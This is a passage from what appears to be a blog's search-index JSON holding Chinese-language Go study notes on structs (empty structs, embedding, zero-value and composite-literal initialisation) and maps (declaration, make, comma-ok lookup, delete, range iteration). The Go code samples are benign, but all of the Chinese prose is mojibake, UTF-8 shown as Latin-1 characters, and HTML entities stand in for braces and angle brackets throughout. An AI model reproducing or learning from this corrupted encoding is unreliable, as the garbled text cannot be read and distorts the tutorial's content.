‡è¯†ç¬¦çš„ï¼Œæ‰€ä»¥åœ¨å…¶ä»–åŒ…ä¸­ä¹Ÿå¯ä»¥è¢«è®¿é—®åˆ°ï¼Œåä¹‹ï¼Œå¦‚æœæ˜¯å°å†™ï¼Œåˆ™åªèƒ½åœ¨å½“å‰åŒ…ä¸­ä½¿ç”¨ã€‚ç»“æ„ä½“ä¸­çš„å­—æ®µä¹Ÿéµå¾ªè¿™ä¸ªè§„åˆ™ã€‚ é™¤äº†ä¸Šé¢è¿™ç§å…¸å‹çš„å®šä¹‰æ–¹å¼ï¼Œè¿˜æœ‰å‡ ç§ç‰¹æ®Šçš„æƒ…å†µã€‚ ç©ºç»“æ„ä½“å¯ä»¥å®šä¹‰ä¸€ä¸ªç©ºç»“æ„ä½“ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åŒ…å«ä»»ä½•å­—æ®µçš„ç»“æ„ä½“ç±»å‹ï¼š 12345type Empty struct&#123;&#125; // Emptyæ˜¯ä¸€ä¸ªä¸åŒ…å«ä»»ä½•å­—æ®µçš„ç©ºç»“æ„ä½“ç±»å‹var e Empty// æŸ¥çœ‹å˜é‡å†…å­˜å ç”¨å¤§å°println(unsafe.Sizeof(e)) // 0 å› ä¸ºç©ºç»“æ„ä½“ç±»å‹å˜é‡çš„å†…å­˜å ç”¨ä¸º 0ï¼ŒåŸºäºç©ºç»“æ„ä½“ç±»å‹å†…å­˜é›¶å¼€é”€è¿™æ ·çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½œä¸ºâ€œäº‹ä»¶â€ä¿¡æ¯è¿›è¡Œ Goroutine ä¹‹é—´çš„é€šä¿¡ï¼š 12var c = make(chan Empty) // å£°æ˜ä¸€ä¸ªå…ƒç´ ç±»å‹ä¸ºEmptyçš„channelc&lt;-Empty&#123;&#125; // å‘channelå†™å…¥ä¸€ä¸ªâ€œäº‹ä»¶â€ è¿™ç§ä»¥ç©ºç»“æ„ä½“ä¸ºå…ƒç´ ç±»å»ºç«‹çš„ channelï¼Œæ˜¯ç›®å‰èƒ½å®ç°çš„ã€å†…å­˜å ç”¨æœ€å°çš„ Goroutine é—´é€šä¿¡æ–¹å¼ã€‚ ç±»å‹åµŒå…¥ç±»å‹åµŒå…¥æŒ‡çš„å°±æ˜¯åœ¨ä¸€ä¸ªç±»å‹çš„å®šä¹‰ä¸­åµŒå…¥äº†å…¶ä»–ç±»å‹ï¼ŒGo è¯­è¨€æ”¯æŒä¸¤ç§ç±»å‹åµŒå…¥ï¼Œæ¥å£ç±»å‹çš„ç±»å‹åµŒå…¥å’Œç»“æ„ä½“ç±»å‹çš„ç±»å‹åµŒå…¥ã€‚ è¿™é‡Œå…ˆåªä»‹ç»ç»“æ„ä½“ç±»å‹çš„ç±»å‹åµŒå…¥ï¼Œåé¢çš„ç¬”è®°ä¸­ä¼šè¯¦ç»†ä»‹ç»å®ƒä¿©ã€‚ 12345678910111213141516type Person struct &#123; Name string Phone string Addr string&#125;type Book1 struct &#123; Title string Author Person&#125;// è¿˜å¯ä»¥ä½¿ç”¨åµŒå…¥å­—æ®µ çœç•¥å­—æ®µåç§°type Book2 struct &#123; Title string Person&#125; è®¿é—® Book ç»“æ„ä½“å­—æ®µ Author ä¸­çš„ Phone å­—æ®µï¼Œä¸‹é¢ä¸¤ç§æ–¹å¼æ˜¯ç­‰ä»·çš„ï¼š 12345678var book1 Book1var book2 Book2// æ­£å¸¸é€šè¿‡ç»“æ„ä½“å­—æ®µä¸€å±‚ä¸€å±‚è®¿é—®println(book1.Author.Phone)// ç›´æ¥è®¿é—®åµŒå…¥å­—æ®µæ‰€å±ç±»å‹ä¸­å­—æ®µprintln(book2.Phone) ç»“æ„ä½“çš„å£°æ˜ä¸åˆå§‹åŒ–å’Œå…¶ä»–æ‰€æœ‰å˜é‡çš„å£°æ˜ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ ‡å‡†å˜é‡å£°æ˜è¯­å¥ï¼Œæˆ–è€…æ˜¯çŸ­å˜é‡å£°æ˜è¯­å¥å£°æ˜ä¸€ä¸ªç»“æ„ä½“ç±»å‹çš„å˜é‡ï¼š 12345678type Book struct &#123; // ...&#125;// è¿™ä¸‰ç§æ–¹å¼éƒ½æ˜¯ç­‰ä»·çš„var book Bookvar book = Book&#123;&#125;book := Book&#123;&#125; // æ¨èä½¿ç”¨å¤åˆå­—é¢å€¼çš„å½¢å¼ é›¶å€¼åˆå§‹åŒ–é›¶å€¼åˆå§‹åŒ–è¯´çš„æ˜¯ä½¿ç”¨ç»“æ„ä½“çš„é›¶å€¼ä½œä¸ºå®ƒçš„åˆå§‹å€¼ã€‚ ç»“æ„ä½“ç±»å‹çš„é›¶å€¼å˜é‡ï¼Œé€šå¸¸ä¸å…·æœ‰æˆ–è€…å¾ˆéš¾å…·æœ‰åˆç†çš„æ„ä¹‰ï¼Œæ¯”å¦‚é€šè¿‡ä¸‹é¢ä»£ç å¾—åˆ°çš„é›¶å€¼ book å˜é‡å°±æ˜¯è¿™æ ·ï¼š 1var book Book // bookä¸ºé›¶å€¼ç»“æ„ä½“å˜é‡ å› ä¸ºä¸€æœ¬ä¹¦æ—¢æ²¡æœ‰ä¹¦åï¼Œä¹Ÿæ²¡æœ‰ä½œè€…ã€é¡µæ•°ã€ç´¢å¼•ç­‰ä¿¡æ¯ï¼Œé‚£ä¹ˆé€šè¿‡ Book ç±»å‹å¯¹è¿™æœ¬ä¹¦çš„æŠ½è±¡å°±å¤±å»äº†å®é™…ä»·å€¼ã€‚æ‰€ä»¥å¯¹äºåƒ Book è¿™æ ·çš„ç»“æ„ä½“ç±»å‹ï¼Œä½¿ç”¨é›¶å€¼åˆå§‹åŒ–å¹¶ä¸æ˜¯æ­£ç¡®çš„é€‰æ‹©ã€‚ ä½†æ˜¯è¿™å¹¶ä¸æ˜¯æ„å‘³ç€é›¶å€¼åˆå§‹åŒ–å°±å®Œå…¨æ²¡æœ‰æ„ä¹‰äº†ï¼Œç›¸åï¼Œå¦‚æœä¸€ç§ç±»å‹é‡‡ç”¨é›¶å€¼åˆå§‹åŒ–å¾—åˆ°çš„é›¶å€¼å˜é‡ï¼Œæ˜¯æœ‰æ„ä¹‰çš„ï¼Œè€Œä¸”æ˜¯ç›´æ¥å¯ç”¨çš„ã€‚ å¯ä»¥è¯´ï¼Œå®šä¹‰é›¶å€¼å¯ç”¨ç±»å‹æ˜¯ç®€åŒ–ä»£ç ã€æ”¹å–„å¼€å‘è€…ä½¿ç”¨ä½“éªŒçš„ä¸€ç§é‡è¦çš„æ‰‹æ®µã€‚ Go æ ‡å‡†åº“ä¸­çš„ bytes.Buffer ç»“æ„ä½“ç±»å‹ï¼Œå°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ä¾‹å­ï¼š 123var b bytes.Buffer b.Write([]byte(\"Hello, Go\"))fmt.Println(b.String()) // è¾“å‡ºï¼šHello, Go å¯ä»¥çœ‹åˆ°ä¸éœ€è¦å¯¹ bytes.Buffer ç±»å‹çš„å˜é‡ b è¿›è¡Œä»»ä½•æ˜¾å¼åˆå§‹åŒ–ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡å¤„äºé›¶å€¼çŠ¶æ€çš„å˜é‡ bï¼Œè°ƒç”¨å®ƒçš„æ–¹æ³•è¿›è¡Œå†™å…¥å’Œè¯»å–æ“ä½œã€‚ å¤åˆå­—é¢å€¼æœ€ç®€å•çš„å¯¹ç»“æ„ä½“å˜é‡è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–çš„æ–¹å¼ï¼Œå°±æ˜¯æŒ‰é¡ºåºä¾æ¬¡ç»™æ¯ä¸ªç»“æ„ä½“å­—æ®µè¿›è¡Œèµ‹å€¼ï¼š 123456789type Book struct &#123; Title string // ä¹¦å Pages int // ä¹¦çš„é¡µæ•° Indexes map[string]int // ä¹¦çš„ç´¢å¼•&#125;var book = Book&#123;\"The Go Programming Language\", 700, make(map[string]int)&#125;println(\"Book Nameï¼š\", book.Title) // Book Nameï¼šThe Go Programming Languageprintln(\"Book Pagesï¼š\", book.Pages) // Book Pagesï¼š700 è¿™ç§æ–¹å¼è™½ç„¶æ˜¯æœ€ç®€å•çš„ï¼Œä½†æ˜¯å´ä¸æ˜¯æœ€ä¼˜çš„ï¼Œå› ä¸ºå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼š å½“ç»“æ„ä½“ç±»å‹å®šä¹‰ä¸­çš„å­—æ®µé¡ºåºå‘ç”Ÿå˜åŒ–ï¼Œæˆ–è€…å­—æ®µå‡ºç°å¢åˆ æ“ä½œæ—¶ï¼Œå°±éœ€è¦æ‰‹åŠ¨è°ƒæ•´è¯¥ç»“æ„ä½“ç±»å‹å˜é‡çš„æ˜¾å¼åˆå§‹åŒ–ä»£ç  å½“ä¸€ä¸ªç»“æ„ä½“çš„å­—æ®µè¾ƒå¤šæ—¶ï¼Œè¿™ç§é€ä¸€å­—æ®µèµ‹å€¼çš„æ–¹å¼å®æ–½èµ·æ¥å°±ä¼šæ¯”è¾ƒå›°éš¾ï¼Œå¢åŠ å¼€å‘è€…çš„å¿ƒæ™ºè´Ÿæ‹… ä¸€æ—¦ç»“æ„ä½“ä¸­åŒ…å«éå¯¼å‡ºå­—æ®µï¼Œé‚£ä¹ˆè¿™ç§é€ä¸€å­—æ®µèµ‹å€¼çš„æ–¹å¼å°±ä¸å†è¢«æ”¯æŒäº†ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ Go è¯­è¨€æ¨èæˆ‘ä»¬ç”¨ field:value å½¢å¼çš„å¤åˆå­—é¢å€¼ï¼Œå¯¹ç»“æ„ä½“ç±»å‹å˜é‡è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–ï¼š 12345var book = Book &#123; Title: \"The Go Programming Language\", Pages: 700, Indexes: make(map[string]int),&#125; ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œä¸ç”¨æ‹…å¿ƒç»“æ„ä½“å­—æ®µçš„é¡ºåºã€‚æœªæ˜¾å¼å‡ºç°åœ¨å­—é¢å€¼ä¸­çš„ç»“æ„ä½“å­—æ®µå°†é‡‡ç”¨å®ƒå¯¹åº”ç±»å‹çš„é›¶å€¼ã€‚ æ€»ç»“ Go è¯­è¨€ä¸æ˜¯ä¸€é—¨é¢å‘å¯¹è±¡èŒƒå¼çš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒæ²¡æœ‰ C++ æˆ– Java ä¸­çš„é‚£ç§ class ç±»å‹ Go è¯­è¨€é€šè¿‡ç»“æ„ä½“ï¼Œæä¾›æŠ½è±¡èƒ½åŠ› ç»“æ„ä½“çš„å®šä¹‰ä¸æ”¯æŒé€’å½’ ç»“æ„ä½“çš„åˆå§‹åŒ–æœ‰å‡ ç§æ–¹å¼ï¼šé›¶å€¼åˆå§‹åŒ–ã€å¤åˆå­—é¢å€¼åˆå§‹åŒ–ï¼Œä¾æ®å®é™…åœºæ™¯é€‰æ‹©ä½¿ç”¨ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”map","slug":"go-language-study-notes-map","date":"2022-10-27T15:25:51.000Z","updated":"2023-02-18T03:28:33.591Z","comments":true,"path":"go-language-study-notes-map/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-map/","excerpt":"ä½œä¸º Go è¯­è¨€å¤åˆç±»å‹ä¹‹ä¸€çš„å­—å…¸ mapï¼Œä½¿ç”¨é¢‘ç‡ä¹Ÿæ˜¯è¾ƒé«˜çš„ã€‚","text":"ä½œä¸º Go è¯­è¨€å¤åˆç±»å‹ä¹‹ä¸€çš„å­—å…¸ mapï¼Œä½¿ç”¨é¢‘ç‡ä¹Ÿæ˜¯è¾ƒé«˜çš„ã€‚ å¾ˆå¤šä¸­æ–‡ Go ç¼–ç¨‹è¯­è¨€ç±»æŠ€æœ¯ä¹¦ç±éƒ½ä¼šå°†å®ƒç¿»è¯‘ä¸ºæ˜ å°„ã€å“ˆå¸Œè¡¨æˆ–å­—å…¸ï¼Œåœ¨è¿™ç¯‡ç¬”è®°ä¸­çº¦å®šä½¿ç”¨ mapã€‚ mapmap æ˜¯ Go è¯­è¨€æä¾›çš„ä¸€ç§æŠ½è±¡æ•°æ®ç±»å‹ï¼Œç”¨äºå®ç°ç‰¹å®šé”®å€¼çš„å¿«é€ŸæŸ¥æ‰¾ä¸æ›´æ–°ï¼Œå®ƒè¡¨ç¤ºä¸€ç»„æ— åºçš„é”®å€¼å¯¹ï¼Œmap ä¸­çš„æ¯ä¸ª key éƒ½æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”æœ‰ä¸ä¹‹å¯¹åº”çš„ä¸€ä¸ª valueã€‚ å’Œåˆ‡ç‰‡ç±»ä¼¼ï¼Œä½œä¸ºå¤åˆç±»å‹çš„ mapï¼Œå®ƒåœ¨ Go ä¸­çš„ç±»å‹è¡¨ç¤ºä¹Ÿæ˜¯ç”± key ç±»å‹ä¸ value ç±»å‹ç»„æˆçš„ï¼Œå°±åƒä¸‹é¢ä»£ç ï¼š 1map[key_type]value_type å’Œæ•°ç»„ä¸€æ ·ï¼Œå¦‚æœä¸¤ä¸ª map ç±»å‹çš„ key å…ƒç´ ç±»å‹ç›¸åŒï¼Œvalue å…ƒç´ ç±»å‹ä¹Ÿç›¸åŒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯´å®ƒä»¬æ˜¯åŒä¸€ä¸ª map ç±»å‹ï¼Œå¦åˆ™å°±æ˜¯ä¸åŒçš„ map ç±»å‹ã€‚ 123456789func foo(map[int]int) &#123;&#125;func main() &#123; var m1 map[int]int var m2 map[int]string foo(m1) // æ­£å¸¸ç¼–è¯‘ foo(m2) // ç¼–è¯‘å¤±è´¥ï¼šmap[int]string ä¸å‡½æ•°fooå‚æ•°çš„ç±»å‹map[int]int ä¸æ˜¯åŒä¸€mapç±»å‹&#125; éœ€è¦æ³¨æ„çš„æ˜¯ map è™½ç„¶å¯¹ value æ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯å¯¹ key çš„ç±»å‹æœ‰ä¸¥æ ¼çš„è¦æ±‚ã€‚å› ä¸ºéœ€è¦ä¿è¯ key çš„å”¯ä¸€æ€§ï¼Œkey ç±»å‹å°±å¿…é¡»æ”¯æŒ == å’Œ != è¿™ä¸¤ç§æ¯”è¾ƒè¿ç®—ç¬¦ã€‚ é‚£ä¹ˆæœ‰å“ªäº›ç±»å‹ä¸èƒ½ä½œä¸º map çš„ key ç±»å‹å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯å‡½æ•°ç±»å‹ã€map ç±»å‹ä»¥åŠåˆ‡ç‰‡ç±»å‹ã€‚ å¯ä»¥æ¥åšä¸€ä¸ªå®éªŒï¼š 123456789s1 := make([]int, 1)s2 := make([]int, 2)f1 := func() &#123;&#125;f2 := func() &#123;&#125;m1 := make(map[int]string)m2 := make(map[int]string)println(s1 == s2) // ç¼–è¯‘å¤±è´¥ï¼šinvalid operation: s1 == s2 (slice can only be compared to nil)println(f1 == f2) // ç¼–è¯‘å¤±è´¥ï¼šinvalid operation: f1 == f2 (func can only be compared to nil)println(m1 == m2) // ç¼–è¯‘å¤±è´¥ï¼šinvalid operation: m1 == m2 (map can only be compared to nil) å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸‰ç§ç±»å‹ç›´æ¥è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œä¼šç¼–è¯‘å¤±è´¥ã€‚ map çš„å£°æ˜ä¸åˆå§‹åŒ–å¯ä»¥è¿™æ ·å£°æ˜ä¸€ä¸ª map å˜é‡ï¼š 1var m map[string]int // å£°æ˜ä¸€ä¸ª map[string]int ç±»å‹çš„å˜é‡ å’Œåˆ‡ç‰‡ç±»å‹å˜é‡ä¸€æ ·ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºèµ‹äºˆ map å˜é‡åˆå§‹å€¼ï¼Œ map ç±»å‹å˜é‡çš„é»˜è®¤å€¼å°±æ˜¯ nilã€‚ ä¸è¿‡ä¸åŒçš„æ˜¯ï¼Œåˆå§‹å€¼ä¸º nil çš„åˆ‡ç‰‡ï¼Œå¯ä»¥å€ŸåŠ© append å‡½æ•°å¯¹å…¶è¿›è¡Œæ“ä½œã€‚è€Œ map å› ä¸ºè‡ªèº«å…¶å¤æ‚çš„å®ç°æ–¹å¼ï¼Œæ— æ³•â€œé›¶å€¼å¯ç”¨â€ã€‚æ‰€ä»¥ï¼Œå¦‚æœç›´æ¥å¯¹å¤„äºé›¶å€¼çš„ map è¿›è¡Œæ“ä½œï¼Œå°±ä¼šå¯¼è‡´è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆpanicï¼‰ï¼Œä»è€Œå¯¼è‡´ç¨‹åºè¿›ç¨‹å¼‚å¸¸é€€å‡ºï¼š 12var m map[string]int // m = nilm[\"key\"] = 1 // å‘ç”Ÿè¿è¡Œæ—¶å¼‚å¸¸ï¼španic: assignment to entry in nil map æ‰€ä»¥ï¼Œåœ¨ä½¿ç”¨ map ä¹‹å‰ï¼Œå¿…é¡»å…ˆå¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆå§‹åŒ–æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸‹é¢ä¸€ä¸€è¯´æ˜ã€‚ å¤åˆå­—é¢å€¼åˆå§‹åŒ–1m := map[int]int&#123;&#125; å’Œå‰é¢å£°æ˜ map å¾ˆåƒï¼Œä¸è¿‡æœ‰ä¸¤ç‚¹ä¸åŒï¼švar å…³é”®å­—æ›¿æ¢æˆäº† :=ï¼Œå…¶æ¬¡å°±æ˜¯ value ç±»å‹åé¢å¤šäº†ä¸€å¯¹èŠ±æ‹¬å·ã€‚ è™½ç„¶æ­¤æ—¶ map ç±»å‹å˜é‡ m ä¸­æ²¡æœ‰ä»»ä½•é”®å€¼å¯¹ï¼Œä½†å˜é‡ m ä¹Ÿä¸ç­‰åŒäºåˆå€¼ä¸º nil çš„ map å˜é‡ã€‚ å†æ¬¡è¿›è¡Œæ“ä½œï¼Œå°±ä¸ä¼šå¼•å‘è¿è¡Œå¼‚å¸¸ã€‚ 123m := map[int]int&#123;&#125;m[99] = 99println(\"m[99] = \", m[99]) // m[99] = 99 å¯¹äºç¨å¾®å¤æ‚ä¸€äº›çš„å¤åˆå­—é¢å€¼ï¼Œå¯ä»¥ä½¿ç”¨ Go è¯­è¨€æä¾›çš„â€œè¯­æ³•ç³–â€çœç•¥éƒ¨åˆ†å­—é¢å€¼ï¼š 12345678910111213141516171819202122type Position struct &#123; x float64 y float64&#125;// æ­£å¸¸ç¼–è¯‘ï¼Œä½†å†™æ³•æ¯”è¾ƒè‡ƒè‚¿m1 := map[Position]string&#123; Position&#123;29.935523, 52.568915&#125;: \"school\", Position&#123;25.352594, 113.304361&#125;: \"shopping-mall\", Position&#123;73.224455, 111.804306&#125;: \"hospital\",&#125;// åŒæ ·æ­£å¸¸ç¼–è¯‘ï¼Œé€šè¿‡ä½¿ç”¨è¯­æ³•ç³–ç›´æ¥çœç•¥ key ç±»å‹m2 := map[Position]string&#123; &#123;29.935523, 52.568915&#125;: \"school\", &#123;25.352594, 113.304361&#125;: \"shopping-mall\", &#123;73.224455, 111.804306&#125;: \"hospital\",&#125;// ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œå¯¹ map è¿›è¡Œæ’å…¥æ“ä½œæ—¶ï¼Œä¸èƒ½çœç•¥å¦åˆ™ä¼šè¯­æ³•é”™è¯¯m2[Position&#123;22.935523, 34.568915&#125;] = \"store\" // æ­£å¸¸ç¼–è¯‘m2[&#123;22.935523, 34.568915&#125;] = \"store\" // è¯­æ³•é”™è¯¯ make å‡½æ•°å’Œåˆ‡ç‰‡ä¸€æ ·ï¼Œé€šè¿‡ make çš„åˆå§‹åŒ–æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¸º map ç±»å‹å˜é‡æŒ‡å®šé”®å€¼å¯¹çš„åˆå§‹å®¹é‡ï¼Œä½†æ— æ³•è¿›è¡Œå…·ä½“çš„é”®å€¼å¯¹èµ‹å€¼ï¼š 12m1 := make(map[int]string) // æœªæŒ‡å®šåˆå§‹å®¹é‡m2 := make(map[int]string, 8) // æŒ‡å®šåˆå§‹å®¹é‡ä¸º8 ä¸è¿‡ï¼Œmap ç±»å‹çš„å®¹é‡ä¸ä¼šå—é™äºå®ƒçš„åˆå§‹å®¹é‡å€¼ï¼Œå½“å…¶ä¸­çš„é”®å€¼å¯¹æ•°é‡è¶…è¿‡åˆå§‹å®¹é‡åï¼ŒGo è¿è¡Œæ—¶ä¼šè‡ªåŠ¨å¢åŠ  map ç±»å‹çš„å®¹é‡ï¼Œä¿è¯åç»­é”®å€¼å¯¹çš„æ­£å¸¸æ’å…¥ã€‚ map åŸºæœ¬æ“ä½œå› ä¸º map æ˜¯ Go è¯­è¨€ä¸­ååˆ†å¸¸ç”¨çš„å¤åˆæ•°æ®ç±»å‹ï¼Œæ‰€ä»¥ä¸‹é¢æ¥ä¸€ä¸€äº†è§£ä¸‹å¸¸ç”¨çš„æ“ä½œæœ‰å“ªäº›ã€‚ æ’å…¥æ“ä½œé¢å¯¹ä¸€ä¸ªé nil çš„ map ç±»å‹å˜é‡ï¼Œå¯ä»¥æ’å…¥ç¬¦åˆ map ç±»å‹å®šä¹‰çš„ä»»æ„é”®å€¼å¯¹ã€‚ æ’å…¥æ–°é”®å€¼å¯¹çš„æ–¹å¼å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠ value èµ‹å€¼ç»™ map ä¸­å¯¹åº”çš„ key å°±å¯ä»¥äº†ï¼š 12345678m := make(map[int]string)m[1] = \"value1\"m[2] = \"value2\"m[3] = \"value3\"// å¦‚æœå¯¹ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ key è¿›è¡Œæ’å…¥æ“ä½œä¼šè¦†ç›–åŸå€¼m[1] = \"new value1\"// æ­¤æ—¶ m ä¸º map[1:new value1 2:value2 3:value3] Go è¿è¡Œæ—¶ä¼šè´Ÿè´£ map å˜é‡å†…éƒ¨çš„å†…å­˜ç®¡ç†ï¼Œå› æ­¤é™¤éæ˜¯ç³»ç»Ÿå†…å­˜è€—å°½ï¼Œå¦åˆ™ä¸ç”¨æ‹…å¿ƒå‘ map ä¸­æ’å…¥æ–°æ•°æ®çš„æ•°é‡å’Œæ‰§è¡Œç»“æœã€‚ è·å–é”®å€¼å¯¹æ•°é‡åˆ‡ç‰‡å¯ä»¥é€šè¿‡ len å‡½æ•°è·å–å…¶é•¿åº¦ï¼Œmap ä¹Ÿå¯ä»¥é€šè¿‡å†…ç½®å‡½æ•° lenï¼Œè·å–å½“å‰å˜é‡å·²ç»å­˜å‚¨çš„é”®å€¼å¯¹æ•°é‡ï¼š 1234567m := map[string]int &#123; \"key1\" : 1, \"key2\" : 2,&#125;fmt.Println(len(m)) // 2m[\"key3\"] = 3 fmt.Println(len(m)) // 3 ä¸è¿‡ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬ä¸èƒ½å¯¹ map ç±»å‹å˜é‡è°ƒç”¨ capï¼Œæ¥è·å–å½“å‰å®¹é‡ï¼Œè¿™æ˜¯ map ç±»å‹ä¸åˆ‡ç‰‡ç±»å‹çš„ä¸€ä¸ªä¸åŒç‚¹ã€‚ æŸ¥æ‰¾å’Œæ•°æ®è¯»å–å’Œå†™å…¥ç›¸æ¯”ï¼Œmap ç±»å‹æ›´å¤šç”¨åœ¨æŸ¥æ‰¾å’Œæ•°æ®è¯»å–åœºåˆã€‚æ‰€è°“æŸ¥æ‰¾ï¼Œå°±æ˜¯åˆ¤æ–­æŸä¸ª key æ˜¯å¦å­˜åœ¨äºæŸä¸ª map ä¸­ã€‚æœ‰äº†å‰é¢å‘ map æ’å…¥é”®å€¼å¯¹çš„åŸºç¡€ï¼Œå¯èƒ½è‡ªç„¶è€Œç„¶åœ°æƒ³åˆ°ï¼Œå¯ä»¥ç”¨ä¸‹é¢ä»£ç å»æŸ¥æ‰¾ä¸€ä¸ªé”®å¹¶è·å¾—è¯¥é”®å¯¹åº”çš„å€¼ï¼š 12m := make(map[string]int)v := m[\"key1\"] ä¹ä¸€çœ‹ï¼Œç¬¬äºŒè¡Œä»£ç åœ¨è¯­æ³•ä¸Šå¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆä¸å½“ä¹‹å¤„ï¼Œä½†å…¶å®é€šè¿‡è¿™è¡Œè¯­å¥ï¼Œæ— æ³•ç¡®å®šé”® key1 æ˜¯å¦çœŸå®å­˜åœ¨äº map ä¸­ã€‚è¿™æ˜¯å› ä¸ºï¼Œå½“å°è¯•å»è·å–ä¸€ä¸ªé”®å¯¹åº”çš„å€¼çš„æ—¶å€™ï¼Œå¦‚æœè¿™ä¸ªé”®åœ¨ map ä¸­å¹¶ä¸å­˜åœ¨ï¼Œä¹Ÿä¼šå¾—åˆ°ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼æ˜¯ value å…ƒç´ ç±»å‹çš„é›¶å€¼ã€‚ ä»¥ä¸Šé¢è¿™ä¸ªä»£ç ä¸ºä¾‹ï¼Œå¦‚æœé”® key1 åœ¨ map ä¸­å¹¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆ v çš„å€¼å°±ä¼šè¢«èµ‹äºˆ value å…ƒç´ ç±»å‹ int çš„é›¶å€¼ï¼Œä¹Ÿå°±æ˜¯ 0ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯æ²¡æœ‰åŠæ³•æ­£ç¡®æŸ¥æ‰¾çš„ã€‚ Go è¯­è¨€çš„ map ç±»å‹æ”¯æŒé€šè¿‡ç”¨ä¸€ç§åä¸º comma ok çš„æƒ¯ç”¨æ³•ï¼Œè¿›è¡Œå¯¹æŸä¸ª key çš„æŸ¥è¯¢ã€‚ 123456m := make(map[string]int)v, ok := m[\"key1\"]if !ok &#123; // \"key1\"ä¸åœ¨mapä¸­&#125;// \"key1\"åœ¨mapä¸­ï¼Œvå°†è¢«èµ‹äºˆ\"key1\"é”®å¯¹åº”çš„value å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œé€šè¿‡ä¸€ä¸ªå¸ƒå°”ç±»å‹å˜é‡ okï¼Œæ¥åˆ¤æ–­é”®â€œkey1â€æ˜¯å¦å­˜åœ¨äº map ä¸­ã€‚å¦‚æœå­˜åœ¨ï¼Œå˜é‡ v å°±ä¼šè¢«æ­£ç¡®åœ°èµ‹å€¼ä¸ºé”®â€œkey1â€å¯¹åº”çš„ valueã€‚ ä¸è¿‡ï¼Œå¦‚æœå¹¶ä¸å…³å¿ƒæŸä¸ªé”®å¯¹åº”çš„ valueï¼Œè€Œåªå…³å¿ƒæŸä¸ªé”®æ˜¯å¦åœ¨äº map ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ‡è¯†ç¬¦ _ æ›¿ä»£å˜é‡ vï¼Œå¿½ç•¥å¯èƒ½è¿”å›çš„ valueï¼š 12m := make(map[string]int)_, ok := m[\"key1\"] _, ok è¿™ç§ç”¨æ³•åœ¨ Go è¯­è¨€ä¸­ä¹Ÿéå¸¸å¸¸è§ã€‚ åˆ é™¤æ“ä½œåœ¨ Go è¯­è¨€ä¸­ï¼Œéœ€è¦å€ŸåŠ©å†…ç½®å‡½æ•° delete æ¥ä» map ä¸­åˆ é™¤æ•°æ®ã€‚ ä½¿ç”¨ delete å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ map ç±»å‹å˜é‡ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æƒ³è¦åˆ é™¤çš„é”®ã€‚ 1234567m := map[string]int &#123; \"key1\" : 1, \"key2\" : 2,&#125;fmt.Println(m) // map[key1:1 key2:2]delete(m, \"key2\") // åˆ é™¤\"key2\"fmt.Println(m) // map[key1:1] éå†å’Œåˆ‡ç‰‡ä¸€æ ·ï¼Œä½¿ç”¨ for range è¯­å¥è¿›è¡Œéå†ã€‚ 1234567891011121314151617func doIteration(m map[int]int) &#123; fmt.Printf(\"&#123; \") for k, v := range m &#123; fmt.Printf(\"[%d, %d] \", k, v) &#125; fmt.Printf(\"&#125;\\n\")&#125;func main() &#123; m := map[int]int&#123; 1: 11, 2: 12, 3: 13, &#125; for i := 0; i &lt; 3; i++ &#123; doIteration(m) &#125;&#125; æ¯æ¬¡è¿­ä»£éƒ½ä¼šè¿”å›ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­é”®å­˜åœ¨äºå˜é‡ k ä¸­ï¼Œå®ƒå¯¹åº”çš„å€¼å­˜å‚¨åœ¨å˜é‡ v ä¸­ã€‚ è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¯èƒ½ä¼šå¾—åˆ°è¿™æ ·çš„ç»“æœï¼š 123&#123; [3, 13] [1, 11] [2, 12] &#125;&#123; [1, 11] [2, 12] [3, 13] &#125;&#123; [3, 13] [1, 11] [2, 12] &#125; è¿™æ˜¯å› ä¸ºï¼Œå¯¹åŒä¸€ map åšå¤šæ¬¡éå†çš„æ—¶å€™ï¼Œæ¯æ¬¡éå†å…ƒç´ çš„æ¬¡åºéƒ½ä¸ç›¸åŒã€‚ æ€»ç»“ map 